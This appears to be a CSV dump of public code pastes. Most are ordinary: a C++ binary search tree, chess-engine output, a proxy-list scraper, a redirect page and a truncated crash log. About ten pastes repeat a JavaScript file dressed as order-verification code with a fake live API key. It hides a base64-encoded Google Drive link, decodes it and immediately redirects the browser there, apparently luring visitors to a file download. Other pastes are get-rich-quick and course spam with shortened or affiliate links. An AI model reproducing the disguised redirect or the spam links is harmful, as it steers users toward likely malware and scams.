id,title,username,language,date,content
aSv1967w,Order.js,kammex,JavaScript,Friday 11th of April 2025 01:05:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94846/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H2g0YMFx,Make $1000 15-MINUTES  (BEGINNER) HV,EmergencyFood,JavaScript,Friday 11th of April 2025 01:05:29 PM CDT," 
Pdf https://tinyurl.com/privguidee


s7ioXnJIRn
"
N2WtXWKn,BST insertion and searching,TOFSIR_IU,C++,Friday 11th of April 2025 12:53:43 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define endl ""\n"";
typedef struct tree
{
	int number;
	struct tree *leftChild;
	struct tree *rightChild;
}node;
node *root = NULL;
void insertNode(int value)
{
	node *tempNode;
	node *currentNode=NULL;
	node *parentNode=NULL;
	tempNode = (node *) malloc (sizeof(node));
	tempNode->number=value;
	if(root==NULL)
	{
		root=tempNode;
	}
	else
	{
		currentNode=root;
		while(1)
		{
			parentNode=currentNode;
			if(parentNode->number>value)
			{
				currentNode=parentNode->leftChild;
				if(currentNode==NULL)
				{
					parentNode->leftChild=tempNode;
					return;
				}
			}
			else
			{
				currentNode=parentNode->rightChild;
				if(currentNode==NULL)
				{
					parentNode->rightChild=tempNode;
					return;
				}
			}
		}
	}
}
bool BST(int item)
{
	node *currentNode=root;
	int flag=0;
	while(1)
	{
		if(currentNode->number==item)
		{
			return true;
		}
		else if(currentNode->number<item)
		currentNode=currentNode->rightChild;
		else
		currentNode=currentNode->leftChild;
		if(currentNode==NULL)
		return false;
	}
}
int main()
{
	ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
    int n;
    cin>>n;
    while(n--)
    {
    	int a;
    	cin>>a;
    	insertNode(a);
	}
	cout<<""Insertion done""<<endl;
	int item;
	cin>>item;
	if(BST(item))
	{
		cout<<item<<"" is found""<<endl;
	}
	else
	{
		cout<<item<<"" is not found""<<endl;
	}
}"
my0fEkFW,Market.js,kammex,JavaScript,Friday 11th of April 2025 12:50:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97885/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hV9ebasn,Untitled,kammex,JavaScript,Friday 11th of April 2025 12:35:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pFiic4S9,[Ver3.0 Supported GUI] FRESH HTTP(s)Proxy collection program by Python,r1rk,Python,Friday 11th of April 2025 12:28:23 PM CDT,"# This program does not support languages other than Japanese. Please do not be offended.
# You can run this program to get a list of up to about 300,000 or more proxies.

import tkinter as tk
from tkinter import ttk, messagebox
from datetime import datetime, timedelta
import requests
import threading
import re
import json
import os
 
ALL_PROXIES = set()
 
def get_past_dates(days=31):
    today = datetime.utcnow()
    return [(today - timedelta(days=i)).strftime(""%Y-%m-%d"") for i in range(days)]
 
def fetch_checkerproxy(date):
    try:
        url = f""https://api.checkerproxy.net/v1/landing/archive/{date}""
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            data = res.json()
            proxies = data['data'].get('proxyList', [])
            return proxies, True
        else:
            return [], False
    except:
        return [], False
 
def extract_from_text_url(url):
    try:
        res = requests.get(url, timeout=10)
        return re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d+\b', res.text)
    except:
        return []
 
def extract_from_json_url(url, ip_key=""IP"", port_key=""PORT""):
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        proxies = []
        for entry in data.get(""LISTA"", []):
            ip = entry.get(ip_key)
            port = entry.get(port_key)
            if ip and port:
                proxies.append(f""{ip}:{port}"")
        return proxies
    except:
        return []
 
def collect_proxies(log_widget, progress_bar, progress_label):
    global ALL_PROXIES
    ALL_PROXIES = set()
    now = datetime.now().strftime(""%Y-%m-%d_%H-%M"")
    folder = ""proxies_tool_result""
    if not os.path.exists(folder):
        os.makedirs(folder)
 
    filename_txt = os.path.join(folder, f""httpProxies_{now}.txt"")
    filename_json = os.path.join(folder, f""httpProxies_{now}.json"")
 
    dates = get_past_dates(31)
    skipped_dates = []
 
    log_widget.insert(tk.END, ""=== CheckerProxyの取得を開始します。 ===\n"")
    for i, date in enumerate(dates):
        proxies, success = fetch_checkerproxy(date)
        if success and proxies:
            ALL_PROXIES.update(proxies)
            log_widget.insert(tk.END, f""{date} の取得完了。 ({len(proxies)}件)\n"")
        else:
            skipped_dates.append(date)
            log_widget.insert(tk.END, f""{date} は取得できませんでした。\n"")
        progress_bar[""value""] = (i + 1) / len(dates) * 50
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, ""\n=== 他ソースからの取得を開始します。 ===\n"")
 
    proxy_sources = [
        ""https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt"",
        ""https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"",
        ""https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt"",
        ""https://api.openproxylist.xyz/http.txt"",
        ""https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt"",
        ""https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"",
        ""https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt"",
        ""https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"",
        ""https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt"",
        ""https://rootjazz.com/proxies/proxies.txt"",
        ""https://proxyspace.pro/http.txt"",
        ""https://alexa.lr2b.com/proxylist.txt"",
        ""https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt""
        
    ]
 
    offset = 50 / len(proxy_sources)
    for idx, url in enumerate(proxy_sources):
        log_widget.insert(tk.END, f""{url} から取得中...\n"")
        proxies = extract_from_text_url(url)
        ALL_PROXIES.update(proxies)
        progress_bar[""value""] += offset
        progress_label.config(text=f""{int(progress_bar['value'])}%"")
        log_widget.yview_moveto(1)
        log_widget.update()
 
    log_widget.insert(tk.END, f""\n=== 合計取得件数: {len(ALL_PROXIES)} 件 ===\n"")
 
    with open(filename_txt, ""w"") as f:
        f.write(""\n"".join(sorted(ALL_PROXIES)))
 
    with open(filename_json, ""w"") as f:
        json.dump(sorted(ALL_PROXIES), f, indent=2)
 
    log_widget.insert(tk.END, f""\n保存完了: {filename_txt}, {filename_json}\n"")
    log_widget.yview_moveto(1)
    log_widget.update()
 
    stop_btn.pack(pady=5)
    stop_btn.config(state=""normal"")
 
def stop_application():
    root.quit()
 
def start_collection():
    threading.Thread(target=collect_proxies, args=(log_text, progress, progress_label), daemon=True).start()
 
root = tk.Tk()
root.title(""proxies_collect_tool"")
root.geometry(""640x480"")
 
label = tk.Label(root, text=""HTTP(s) Proxy収集ツール"", font=(""Meiryo"", 14, ""bold""))
label.pack(pady=10)
 
progress = ttk.Progressbar(root, length=500, mode='determinate')
progress.pack(pady=5)
 
progress_label = tk.Label(root, text=""0%"", font=(""Meiryo"", 10))
progress_label.place(relx=0.5, rely=0.3, anchor=""center"")
 
btn = tk.Button(root, text=""Go!"", command=start_collection, font=(""Meiryo"", 12))
btn.pack(pady=5)
 
log_text = tk.Text(root, height=20, wrap=tk.WORD)
log_text.pack(fill=tk.BOTH, padx=10, pady=10, expand=True)
 
stop_btn = tk.Button(root, text=""終了"", command=stop_application, font=(""Meiryo"", 12), state=""disabled"")
 
root.mainloop()"
RGbDvEb1,EARN $900 INSTANTLY 2025⭐ G8,robko,JavaScript,Friday 11th of April 2025 12:24:12 PM CDT," 
Pdf https://tinyurl.com/privguidee


kmTaVhXiYf
"
Gqtf4zqL,amazonka netaha optimalne,max2201111,Python,Friday 11th of April 2025 12:21:29 PM CDT,"Šachový engine s čistým minimaxem
=================================
Analyzuji pozici: 8/8/8/a7/2k1C3/8/8/K7 b - - 0 1

Počáteční pozice:
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . k . C . . . 4
3 . . . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h
Na tahu je: Černý
Hloubka 1: Čas = 0.374s, Dokončeno!
Hloubka 2: Čas = 0.126s, Dokončeno!
Hloubka 3: Čas = 1.920s, Dokončeno!as: 18:46:49
Nalezen mat v hloubce 3!

Tah 1: Černý - Král c4-b3
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 . . . . C . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 2: Bílý - Kardinál e4-a4
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 a . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . . . . . 1
  a b c d e f g h

Tah 3: Černý - Amazonka a5-e1
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 C . . . . . . . 4
3 . k . . . . . . 3
2 . . . . . . . . 2
1 K . . . a . . . 1
  a b c d e f g h

Šach mat!

Kompletní matová posloupnost:
1. Černý: Král c4-b3
2. Bílý: Kardinál e4-a4
3. Černý: Amazonka a5-e1"
vyDCS1kq,JavaScript: the ULTIMATE training,f0f077,JavaScript,Friday 11th of April 2025 12:20:53 PM CDT,"JavaScript: the ULTIMATE training
Master JavaScript with the most comprehensive course online! Projects, exercises, quizzes, ES8, and more!
What you will learn
Using AJAX requests
Understanding how to use jQuery
Have everything you need to REALLY master JavaScript
Add, modify, delete DOM elements
for more:http://earnow.online/19R15b"
CadYuh7q,Products.js,kammex,JavaScript,Friday 11th of April 2025 12:17:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89597/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8greRsa3,Untitled,Josif_tepe,C++,Friday 11th of April 2025 12:17:31 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <cstring>
#include <map>
#include <fstream>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 2;

int main() {
    ios_base::sync_with_stdio(false);
    vector<int> v(4);
    for(int i = 0; i < 4; i++) {
        v[i] = i + 1;
    }
    
    do {
        for(int i = 0; i < 4; i++) {
            cout << v[i] << "" "" ;
        }
        cout << endl;
    } while(next_permutation(v.begin(), v.end()));
}
"
m5iFrDkY,HTML from scratch,f0f077,HTML,Friday 11th of April 2025 12:14:25 PM CDT,"HTML from scratch
Start your web development journey the right way.
What you will learn
HTML markup language
SEO related to HTML
Accessibility related to HTML
The most important tags
for more:http://earnow.online/t4L3qOzC"
VBRaG3qX,Make $1000 15-MINUTES  (BEGINNER) HV,robko,JavaScript,Friday 11th of April 2025 12:10:49 PM CDT," 
Pdf https://tinyurl.com/privguidee


AG66ezObsv
"
1cy8YSF1,"Front-End Web Developer: The Complete Course (HTML, CSS, JS)",f0f077,HTML,Friday 11th of April 2025 12:08:33 PM CDT,"Front-End Web Developer: The Complete Course (HTML, CSS, JS)
Learn HTML5, CSS3, Javascript ES6 with the latest features, create your websites and become a Front-end developer
What you will learn
How the Internet, the Web, and Websites Work
HTML language
The CSS language
Flexbox with CSS
for more:http://earnow.online/hGSWut5S"
PPmZzEqu,Order.js,kammex,JavaScript,Friday 11th of April 2025 12:02:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79115/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5Mkc5ZBP,Market.js,kammex,JavaScript,Friday 11th of April 2025 11:46:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37047/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ymsnZp4f,index.html,Vitaliy_Novichikhin,HTML,Friday 11th of April 2025 11:29:07 AM CDT,"<!DOCTYPE html>
<html lang=""ru"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Этикет. Как лучше понимать друг друга?! Делайте предзаказ на книгу сейчас!</title>
    
    <!-- Main configuration variable -->
    <script>
        // ===== SINGLE CONFIGURATION POINT =====
        const channelConfig = {
            link: 'https://t.me/s/eeetiquette',
            title: 'Этикет и взаимопонимание',
            brand: 'Книга по этикету'
        };
    </script>

    <!-- Dynamic meta refresh redirect -->
    <meta http-equiv=""refresh"" content=""1; url=${channelConfig.link}"">
    
    <style>
        /* Base page styling */
        body {
            margin: 0;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        /* Content container styling */
        .container {
            max-width: 600px;
            padding: 40px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: relative;
            z-index: 1;
        }

        /* Floating footer styles */
        .floating-footer {
            position: fixed;
            bottom: -100%;
            left: 0;
            right: 0;
            background: rgba(40, 40, 40, 0.95);
            color: white;
            padding: 20px;
            transition: bottom 0.5s ease-in-out;
            z-index: 1000;
        }

        .floating-footer.active {
            bottom: 0;
        }

        /* Footer content styling */
        .floating-footer footer {
            max-width: 800px;
            margin: 0 auto;
            position: relative;
        }

        .floating-footer a {
            color: #80b3ff;
            text-decoration: underline;
        }

        /* Close button styling */
        .close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            width: 24px;
            height: 24px;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .close-btn:hover {
            opacity: 1;
        }

        .close-btn::before,
        .close-btn::after {
            content: '';
            position: absolute;
            width: 2px;
            height: 20px;
            background: white;
            left: 11px;
            top: 2px;
        }

        .close-btn::before {
            transform: rotate(45deg);
        }

        .close-btn::after {
            transform: rotate(-45deg);
        }

        /* Action button styling */
        .telegram-button {
            display: inline-flex;
            align-items: center;
            padding: 12px 24px;
            background: #0088cc;
            color: white !important;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
            transition: background 0.2s;
            margin: 15px 0;
        }

        .telegram-button:hover {
            background: #0077b3;
        }

        .telegram-button img {
            width: 24px;
            margin-right: 12px;
        }

        /* Status message styling */
        .notice {
            color: #666;
            font-size: 14px;
            margin-top: 25px;
        }

        /* Loading animation */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0088cc;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class=""container"">
        <!-- Loading indicator -->
        <div class=""loader""></div>
        
        <!-- Dynamic heading -->
        <h1>${channelConfig.brand}<br>${channelConfig.title}</h1>
        
        <!-- Main action button -->
        <a href=""#"" class=""telegram-button"" id=""manualRedirect"">
            <img src=""https://telegram.org/img/t_logo.svg"" alt=""Telegram"">
            Предзаказ книги
        </a>

        <!-- Fallback information -->
        <p class=""notice"">
            Если автоматическое перенаправление не сработало,<br>
            нажмите кнопку выше или перейдите вручную:<br>
            <code id=""channelUrl""></code>
        </p>
    </div>

    <!-- Floating footer component -->
    <div class=""floating-footer"" id=""floatingFooter"">
        <div class=""close-btn"" id=""closeFooter""></div>
        <footer>
            <div>Домен зарегистрирован через <a href=""https://solidario.tech"">SOLIDARIO.TECH</a>. Редкие доменные имена по всему миру. Хотите себе запоминающийся сайт? Пишите сейчас <a href=""mailto:info@solidario.tech"">info@solidario.tech</a></div>
            <div style=""margin-top: 10px;"">Domain registered by <a href=""https://solidario.tech"">SOLIDARIO.TECH</a>. Rare domain names globally. Want yours? Text now <a href=""mailto:info@solidario.tech"">info@solidario.tech</a>!</div>
        </footer>
    </div>

    <script>
        // Dynamic content injection
        document.getElementById('manualRedirect').href = channelConfig.link;
        document.getElementById('channelUrl').textContent = channelConfig.link;

        // Footer management
        let footerTimer;
        const showFooter = () => document.getElementById('floatingFooter').classList.add('active');
        const hideFooter = () => {
            document.getElementById('floatingFooter').classList.remove('active');
            footerTimer = setTimeout(showFooter, 45000);
        };

        // Initial footer show
        setTimeout(showFooter, 500);
        
        // Event listeners
        document.getElementById('closeFooter').addEventListener('click', hideFooter);
        document.getElementById('manualRedirect').addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = channelConfig.link;
        });

        // Backup redirect
        setTimeout(() => {
            window.location.href = channelConfig.link;
        }, 5000);
    </script>
</body>
</html>"
L7j7a8Qz,Products.js,dentira,JavaScript,Friday 11th of April 2025 11:15:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xt1zwEb6,Order.js,dentira,JavaScript,Friday 11th of April 2025 11:00:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87894/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cF9BQus4,Market.js,dentira,JavaScript,Friday 11th of April 2025 10:45:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68678/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TfmvqS8G,2025-04-11T17:33:31.114,powerampache,PHP,Friday 11th of April 2025 10:33:31 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 15:33:31 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744385611080""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744385611060""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 